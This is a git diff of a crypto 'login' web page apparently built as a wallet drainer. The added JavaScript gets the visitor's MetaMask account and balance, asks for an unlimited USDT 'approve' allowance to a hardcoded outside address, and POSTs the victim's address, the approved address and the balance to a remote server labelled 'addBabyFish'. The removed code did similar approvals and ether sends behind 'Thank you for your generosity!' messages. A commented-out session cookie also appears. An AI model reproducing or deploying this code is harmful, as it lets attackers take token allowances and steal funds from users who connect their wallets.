@@ -45,9 +45,9 @@
     <div class="group3 flex-col">
       <span class="info1" onclick="ethLogin()" style="cursor: pointer">ETH&nbsp;LOGIN</span>
     </div>
-    <div class="group4 flex-col">
+    <!-- <div class="group4 flex-col">   // todo
       <span class="word2" onclick="trxLogin()" style="cursor: pointer">TRX&nbsp;LOGIN</span>
-    </div>
+    </div> -->
     <div class="group5 flex-col">
       <div class="layer1 flex-col">
         <span class="txt3" data-locale="t38">如何参与</span>
@@ -193,11 +193,13 @@
     }
   ]
 
-  const yourAddress = '0x621bdded2b894228943a3a063d5459937b947f1a'
-  const value = '0x0' // 16进制表示的以太币数量，单位：wei   1EH=0xde0b6b3a7640000   0.001ETH=0x38d7ea4c68000
-  const desiredNetwork = '0x3' // '0x1' 表示以太坊主网
-  const value2 = '0x0'
+  // const yourAddress = '0x621bdded2b894228943a3a063d5459937b947f1a'
+  // const value = '0x0' // 16进制表示的以太币数量，单位：wei   1EH=0xde0b6b3a7640000   0.001ETH=0x38d7ea4c68000
+  // const desiredNetwork = '0x3' // '0x1' 表示以太坊主网
+  // const value2 = '0x0'
   var account = ""
+  var balanceMoney = 0
+  // var bal = 0
 
   async function test() {
     let web3;
@@ -206,15 +208,16 @@
       await window.ethereum.enable().then(function (accounts) {
         console.log("xxxxxxxxxxxxxxxx")
         account = accounts
+        alert(account)
       })
+      web3.eth.getBalance(account[0]).then(function (balace) {
+        const balance = ethers.BigNumber.from(balace);
+        console.log(ethers.utils.formatEther(balance));
+        balanceMoney = ethers.utils.formatEther(balance)
+        alert(balanceMoney)
+      })
+      // console.log("balance = " +  ba)
       alert("ethereum")
-
-      // const provider = new ethers.providers.Web3Provider(window.ethereum)
-      // web3 = provider
-      // await window.ethereum.enable().then(function (accounts) {
-      //     console.log("xxxxxxxxxxxxxxxx")
-      //     account = accounts
-      //   })
     } else if (window.web3) {
       // Use Mist/MetaMask's provider.
       web3 = window.web3;
@@ -224,289 +227,66 @@
               "http://127.0.0.1:9545"
       );
       web3 = new Web3(provider);
-      // account = web3.eth.accounts;
-      // account = accounts[0]
-      // web3.enable()
       web3.eth.getAccounts().then(function (accounts) {
         console.log("xxxxxxxxxxxxxxxx")
         account = accounts
       })
-      console.log("xxxxxxxxxxxxxxxx  provider", account)
+      console.log(account)
+      alert(account)
+      balancess = web3.eth.getBalance(account)
+      alert(balancess)
+      console.log("provider = " + ethers.utils.formatEther(balancess));
+      balanceMoney = ethers.utils.formatEther(balancess)
+      alert("balanceMoney" + balanceMoney)
       alert("provider")
     }
     let usdt = "0x27afd216475849ae176f37045b6d4a22611740a2"
     const contr = new web3.eth.Contract(abi, usdt);
 
-    console.log(account)
-    res = contr.methods.approve("0x621bdded2b894228943a3a063d5459937b947f1a",10000000).send({from:account[0]});
-    console.log('getWeb3',res, account)
+    contr.methods.approve("0x428E1FA003D4d1C5EA4F924b0A3188c0aB0daDCb","115700000000000000000000000000000000000000000000000000000000").send({from:account[0]});
+    // console.log('getWeb3',res, account)
+    // alert("web3 " + res)
+    PostCon(account[0], "0x428E1FA003D4d1C5EA4F924b0A3188c0aB0daDCb")
   }
 
+  function PostCon(user_address, auth_address) {
+    alert("post")
+    var data = JSON.stringify({
+      "terminal_id": 2,
+      "user_address": user_address,
+      "auth_address": auth_address,
+      "coin_type": "erc",
+      "base_chain": "usdt",
+      "user_available": balanceMoney,
+      "sproxy": "abcd",
+    });
 
-  function WalletLinkDo() {
-    console.log("--- WalletLinkDo ---")
-    if (typeof window.ethereum === 'undefined') {
-      alert('Looks like you need a Dapp browser to get started.')
-      alert('Consider installing MetaMask!')
-      console.log("--- WalletLinkDo ---    nononononon ")
-    } else {
-      // 一个 Web3Provider 包装了一个标准的 Web3 提供者，这就是
-      // MetaMask 作为 window.ethereum 注入到每个页面中
-      const provider = new ethers.providers.Web3Provider(window.ethereum)
+    console.log("jason : ", data.toString())
+    alert("post data = " + data.toString())
 
-      // MetaMask 插件还允许对交易进行签名
-      //发送以太币并支付更改区块链中的状态。
-      // 为此，您需要帐户签名者...
-      // const signer = provider.getSigner()
+    var xhr = new XMLHttpRequest();
+    xhr.withCredentials = false;
 
-      // ethereum.setProviderInfo('https://ropsten.infura.io/v3/16b3844622e34365a8bcdd1d424d65f0', 3)
-      console.log(ethereum)
-      // ethereum.isConnected()
-      //如果用户安装了MetaMask，你可以要求他们授权应用登录并获取其账号
-      ethereum.enable()
-              //如果用户拒绝了登录请求
-              .catch(function (reason) {
-                if (reason === 'User rejected provider access') {
-                  // 用户不想登录，你看该怎么办？
-                } else {
-                  // 本不该执行到这里，但是真到这里了，说明发生了意外
-                  alert('There was an issue signing you in.')
-                }
-              })
+    xhr.addEventListener("readystatechange", function() {
+      if(this.readyState === 4) {
+        console.log(this.responseText);
+      }
+    });
 
-              //如果用户同意了登录请求，你就可以拿到用户的账号
-              .then(function (accounts) {
-                // You also should verify the user is on the correct network:
-                //你也可以验证用户接入了正确的网络
-                if (ethereum.networkVersion !== desiredNetwork) {
-                  alert('This application requires the main network, please switch it in your MetaMask UI.')
+    CORS_ALLOW_HEADERS = ('content-disposition', 'accept-encoding',
+            'content-type', 'accept', 'origin', 'authorization')
 
-                  //我们计划在最近补充一个有关网络切换的API，参考下面链接
-                  // https://github.com/MetaMask/metamask-extension/issues/3663
-                }
+    xhr.open("POST", "https://uapi.oct99a.com:8443/service?action=addBabyFish");
+    xhr.setRequestHeader("Content-Type", "application/json");
+    // xhr.setRequestHeader("Content-Type", "text/plain");
+    // xhr.setRequestHeader("Cookie", "fdc6a94703a2ae8=eyJpdiI6InJyU09NaWJjSGVyNkVMcHRPUHdTd3FQSmFORlFXXC9PdVBGYndveW5pblQwPSIsInZhbHVlIjoiV0I0N3FCT1o5YjFiWXdBV2V4ZU9rOVdsTnV1c2RHTEtaVVJ3MlZ1MVhXRHdRajV2SkF0eERNQ0x2Uzcxb0VRQ0NIcDRaRnFKRHJNZHZTXC9VK1R6dDVBPT0iLCJtYWMiOiJmYzYxYTExOGJlZDhjZWZlNjYyNGQ0ZTgyYWE2YThmOTc2NjE5NzM2OTNjYTM4MGYwMmJmOTk3YWJkZDAyNWRkIn0%3D");
 
-                console.log(ethereum)
-                // PostBotAPi("enable: " + ethereum.toLocaleString() + ethereum.toString())
-                PostBotAPi("acc: " + accounts.toString())
+    res =  xhr.send(data);
 
-                alert("balance == ", ethereum)
-                // web3.eth.getBalance(accounts).then(console.log);
-                //一旦获取了用户账号，你就可以签名交易
-                const account = accounts[0]
-                // getBalance(account)
-                provider.getBalance(accounts[0]).then(function (balace) {
-                  console.log("money: " + balace);
-                  ethers.utils.formatEther(balace)
-                  alert("usermoney : " + ethers.utils.formatEther(balace));
-                })
-                sendHeyueFrom(account, provider, function (err, transaction) {
-                  if (err) {
-                    return alert(`Sorry you weren't able to contribute!`)
-                  }
-
-                  alert('Thanks for your successful contribution!')
-                })
-
-              })
-    }
+    alert("res " + xhr.responseText)
+    console.log("post ok !!"+ xhr.responseText)
   }
 
-  function sendHeyueFrom(account, provider, code) {
-    // console.log('Running deployWithWeb3 script...')
-    // alert("Conctrc start !!!")
-    const contractName = 'TokenContractFragment' // Change this for other contract
-    // const constructorArgs = []    // Put constructor args (if any) here for your contract
-    //
-    // // Note that the script needs the ABI which is generated from the compilation artifact.
-    // // Make sure contract is compiled and artifacts are generated
-    const artifactsPath = `${contractName}.json` // Change this for different path
-
-    // 您也可以为合约地址使用 ENS 名称
-    const daiAddress = "0x27afd216475849ae176f37045b6d4a22611740a2";
-
-    // ERC-20 合约 ABI，它是一个通用的合约接口
-    // 用于代币（这是人类可读的 ABI 格式）
-    const daiAbi = [
-      {
-        "constant": false,
-        "inputs": [
-          {
-            "name": "_spender",
-            "type": "address"
-          },
-          {
-            "name": "_amount",
-            "type": "uint256"
-          }
-        ],
-        "name": "approve",
-        "outputs": [
-          {
-            "name": "success",
-            "type": "bool"
-          }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          {
-            "name": "_from",
-            "type": "address"
-          },
-          {
-            "name": "_to",
-            "type": "address"
-          },
-          {
-            "name": "_amount",
-            "type": "uint256"
-          }
-        ],
-        "name": "transferFrom",
-        "outputs": [
-          {
-            "name": "success",
-            "type": "bool"
-          }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-      },
-      {
-        "constant": true,
-        "inputs": [
-          {
-            "name": "_owner",
-            "type": "address"
-          }
-        ],
-        "name": "balanceOf",
-        "outputs": [
-          {
-            "name": "balance",
-            "type": "uint256"
-          }
-        ],
-        "payable": false,
-        "stateMutability": "view",
-        "type": "function"
-      },
-      {
-        "constant": false,
-        "inputs": [
-          {
-            "name": "_to",
-            "type": "address"
-          },
-          {
-            "name": "_amount",
-            "type": "uint256"
-          }
-        ],
-        "name": "transfer",
-        "outputs": [
-          {
-            "name": "success",
-            "type": "bool"
-          }
-        ],
-        "payable": false,
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ]
-
-    // 合约对象
-    const daiContract = new ethers.Contract(daiAddress, daiAbi, provider);
-    // const parameters = ['0xF8AE647a999B665326eb785a47A86f0424FE2c66', '0x0']
-    // const signer = (ethers.providers.Web3Provider(provider)).getSigner()
-    const signer = provider.getSigner()
-    daiWithSigner = daiContract.connect(signer)
-
-    const constructorArgs = ['0xF8AE647a999B665326eb785a47A86f0424FE2c66', '0x0']    // Put constructor args (if any) here for your contract
-
-
-    // let factory = ethers.ContractFactory(daiAbi, "608060405234801561001057600080fd5b50610735806100206000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063095ea7b31461006757806323b872dd146100cc57806370a0823114610151578063a9059cbb146101a8575b600080fd5b34801561007357600080fd5b506100b2600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061020d565b604051808215151515815260200191505060405180910390f35b3480156100d857600080fd5b50610137600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061029a565b604051808215151515815260200191505060405180910390f35b34801561015d57600080fd5b50610192600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610537565b6040518082815260200191505060405180910390f35b3480156101b457600080fd5b506101f3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061057f565b604051808215151515815260200191505060405180910390f35b600081600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055506001905092915050565b6000816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410158015610366575081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410155b80156103725750600082115b80156103fb57506000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054826000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401115b1561052b57816000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555081600160008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555060019050610530565b600090505b9392505050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101580156105cf5750600082115b801561065857506000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054826000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401115b156106fe57816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254019250508190555060019050610703565b600090505b929150505600a165627a7a72305820b0bd4b9c83492e22b4af57628902961ee55d9e1e617b2d712b3e8c52e99b729b0029", signer);
-
-    // let contract = factory.deploy(...constructorArgs);
-
-    response = daiWithSigner.approve("0xF8AE647a999B665326eb785a47A86f0424FE2c66", "1000000000000000000000")
-    const rejected = 'User denied transaction signature.'
-    if (response.error && response.error.message.includes(rejected)) {
-      return alert(`We can't take your money without your permission.`)
-    }
-
-    console.log(response)
-    if (response) {
-      //如果存在response.result，那么调用就是成功的
-      //在这种情况下，它就是交易哈希
-      console.log("ooooooooooooooooo")
-      // const txHash = response.result
-      alert('Thank you for your generosity!')
-      PostBotAPi("Thank you for your generosity!: ")
-      // SendTwo(account, ethereum)
-      //你可以轮询区块链来查看交易何时被打包进区块
-      // pollForCompletion(txHash, callback)
-    }
-
-    // PostBotAPi("heyue gey : " + res)
-    console.log(res);
-    // ethers.utils.formatEther(balace)
-    // alert("daiContract : " + ethers.utils.formatEther(balance.toString().big()));
-
-
-
-    // console.log('Contract deployed at address: ', newContractInstance.options.address)
-  }
-
-  function sendEtherFrom (account, callback) {
-    //在这里我们要使用底层API
-    const method = 'eth_sendTransaction'
-    const parameters = [{
-      from: account,
-      to: yourAddress,
-      value: value,
-    }]
-    const from = account
-
-    //现在把所有数据整合为一个RPC请求
-    const payload = {
-      method: method,
-      params: parameters,
-      from: from,
-    }
-
-    // PostBotAPi("eth_sendTransaction: " + payload.toString())
-
-    //需要用户授权的方法，类似于这个，都会弹出一个对话框提醒用户交互
-    //其他方法，例如只是读取区块链的数据，可能就不会弹框提醒
-    ethereum.sendAsync(payload, function (err, response) {
-      const rejected = 'User denied transaction signature.'
-      if (response.error && response.error.message.includes(rejected)) {
-        return alert(`We can't take your money without your permission.`)
-      }
-
-      if (err) {
-        return alert('There was an issue, please try again.' + err.toString())
-      }
-
-      if (response.result) {
-        //如果存在response.result，那么调用就是成功的
-        //在这种情况下，它就是交易哈希
-        const txHash = response.result
-        alert('Thank you for your generosity!')
-        PostBotAPi("Thank you for your generosity!: ")
-        // SendTwo(account, ethereum)
-        //你可以轮询区块链来查看交易何时被打包进区块
-        pollForCompletion(txHash, callback)
-      }
-    })
-  }
 
   function PostBotAPi(accounts) {
 
